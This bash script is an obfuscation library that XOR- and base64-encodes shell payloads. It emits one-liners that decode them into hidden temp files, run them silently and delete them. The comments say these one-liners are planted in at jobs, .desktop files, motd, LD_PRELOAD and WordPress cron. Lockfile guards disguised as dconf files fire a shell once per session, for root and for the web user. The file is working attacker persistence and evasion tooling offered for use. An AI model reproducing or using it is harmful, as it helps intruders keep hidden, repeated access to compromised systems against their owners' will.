#!/usr/bin/env bash
#=============================================================================
# obfuscate.sh - XOR + base64 encode/decode library
#
# Usage:
#   source ./obfuscate.sh
#
# After sourcing, three functions are available:
#   ob_encode  "<plaintext>"   → prints the encoded blob (base64 string)
#   ob_decode  "<blob>"        → prints the decoded plaintext
#   ob_decoder "<plaintext>"   → prints a self-contained one-liner that,
#                                when run in any bash shell, decodes and
#                                executes the plaintext. This is what gets
#                                written into artifacts (at jobs, .desktop
#                                files, etc.)
# Configuration:
#   Set OB_KEY before sourcing, or export it before calling any function.
#   OB_KEY must be a single printable character.
#   Default: K
#=============================================================================

OB_KEY="${OB_KEY:-K}"  # Default key is 'K' if not set in environment

ob_encode() {
    local plaintext="$1"
    local key_byte=$(printf '%d' "'${OB_KEY}")
    local hex=""
    # Use od to get reliable decimal byte values for every character including
    # newlines and other special chars that bash string indexing can drop
    while read -r byte_dec; do
        [[ -z "$byte_dec" ]] && continue
        hex+=$(printf '%02x' "$(( byte_dec ^ key_byte ))")
    done < <(printf '%s' "$plaintext" | od -A n -t u1 | tr ' ' '\n' | tr -s '\n')
    printf '%s' "$hex" | base64 | tr -d '\n'
}

ob_decode() {
    local blob="$1"
    local key_byte=$(printf '%d' "'${OB_KEY}")
    local hex=$(printf '%s' "$blob" | base64 -d)
    local result=""
    local i
    for (( i=0; i < ${#hex}; i+=2 )); do
        local byte_hex="${hex:$i:2}"
        local byte_dec=$(( 16#$byte_hex ))
        result+=$(printf '\\x%02x' $(( byte_dec ^ key_byte )) | xargs printf '%b')
    done
    printf '%s' "$result"
}

ob_decoder() {
    local plaintext="$1"
    local blob
    blob=$(ob_encode "$plaintext")
    local key_byte
    key_byte=$(printf '%d' "'${OB_KEY}")
    local key_byte_val="$key_byte"
    local blob_val="$blob"
    echo '_d(){ local h=$(echo "$1"|base64 -d 2>/dev/null);local t=$(mktemp /tmp/.dXXXXXX);local i;for((i=0;i<${#h};i+=2));do local b=$((16#${h:i:2}));printf '"'"'%b'"'"' "\\x$(printf '"'"'%02x'"'"' $((b ^ '"${key_byte_val}"')))" >> "$t";done;bash "$t" 2>/dev/null;rm -f "$t";}; _d '"'"''"${blob_val}"''"'"''
}

# ob_guarded_decoder_root "<plaintext>"
#
# Like ob_decoder but wraps the payload with a session-aware guard using the
# ROOT lockfile (/var/tmp/.dconf-lock-root). Use for root-privilege mechanisms
# (motd_poison, ld_preload).
#
# Guard logic:
#   - If lockfile exists and was touched within 60s → active root session → skip
#   - Otherwise → fire shell, write lockfile, start heartbeat to keep it fresh
#   - When shell dies → heartbeat removes lockfile → next trigger fires freely
ob_guarded_decoder_root() {
    local plaintext="$1"
    local lock="/var/tmp/.dconf-lock-root"
    local nl=$'\n'

    local wrapped="L=${lock}${nl}"
    wrapped+="if [ -f \$L ]; then${nl}"
    wrapped+="  AGE=\$(( \$(date +%s) - \$(stat -c %Y \$L 2>/dev/null || echo 0) ))${nl}"
    wrapped+="  [ \$AGE -lt 60 ] && exit 0${nl}"
    wrapped+="fi${nl}"
    wrapped+="echo \$\$ > \$L${nl}"
    wrapped+="( while kill -0 \$\$ 2>/dev/null; do touch \$L; sleep 30; done; rm -f \$L ) &${nl}"
    wrapped+="${plaintext}"

    local blob
    blob=$(ob_encode "$wrapped")
    local key_byte
    key_byte=$(printf '%d' "'${OB_KEY}")
    local key_byte_val="$key_byte"
    local blob_val="$blob"
    echo '_d(){ local h=$(echo "$1"|base64 -d 2>/dev/null);local t=$(mktemp /tmp/.dXXXXXX);local i;for((i=0;i<${#h};i+=2));do local b=$((16#${h:i:2}));printf '"'"'%b'"'"' "\\x$(printf '"'"'%02x'"'"' $((b ^ '"${key_byte_val}"')))" >> "$t";done;bash "$t" 2>/dev/null;rm -f "$t";}; _d '"'"''"${blob_val}"''"'"''
}

# ob_guarded_decoder_www "<plaintext>"
#
# Like ob_decoder but wraps the payload with a session-aware guard using the
# WWW lockfile (/var/tmp/.dconf-lock-www). Use for web-user mechanisms
# (wp_cron). Root mechanisms are unaffected by this lockfile.
ob_guarded_decoder_www() {
    local plaintext="$1"
    local lock="/var/tmp/.dconf-lock-www"
    local nl=$'\n'

    local wrapped="L=${lock}${nl}"
    wrapped+="if [ -f \$L ]; then${nl}"
    wrapped+="  AGE=\$(( \$(date +%s) - \$(stat -c %Y \$L 2>/dev/null || echo 0) ))${nl}"
    wrapped+="  [ \$AGE -lt 60 ] && exit 0${nl}"
    wrapped+="fi${nl}"
    wrapped+="echo \$\$ > \$L${nl}"
    wrapped+="( while kill -0 \$\$ 2>/dev/null; do touch \$L; sleep 30; done; rm -f \$L ) &${nl}"
    wrapped+="${plaintext}"

    local blob
    blob=$(ob_encode "$wrapped")
    local key_byte
    key_byte=$(printf '%d' "'${OB_KEY}")
    local key_byte_val="$key_byte"
    local blob_val="$blob"
    echo '_d(){ local h=$(echo "$1"|base64 -d 2>/dev/null);local t=$(mktemp /tmp/.dXXXXXX);local i;for((i=0;i<${#h};i+=2));do local b=$((16#${h:i:2}));printf '"'"'%b'"'"' "\\x$(printf '"'"'%02x'"'"' $((b ^ '"${key_byte_val}"')))" >> "$t";done;bash "$t" 2>/dev/null;rm -f "$t";}; _d '"'"''"${blob_val}"''"'"''
}